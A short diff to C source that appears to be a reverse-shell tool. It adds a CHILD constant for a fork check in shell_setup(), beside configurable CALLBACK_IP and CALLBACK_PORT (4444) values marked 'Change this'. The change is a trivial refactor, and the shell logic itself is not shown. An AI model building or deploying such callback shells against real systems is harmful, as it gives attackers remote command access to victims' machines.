@@ -11,6 +11,7 @@
 #define CALLBACK_IP "127.1" //Change this
 #define CALLBACK_PORT 4444 //Change this
 #define BUFFER_SIZE 1024
+#define CHILD 0
 
 /*
 * Function: max
@@ -54,7 +55,7 @@ int shell_setup()
         perror("fork");
     }
 
-    if (pid == 0)
+    if (pid == CHILD)
     {
         close(sp[1]);
 
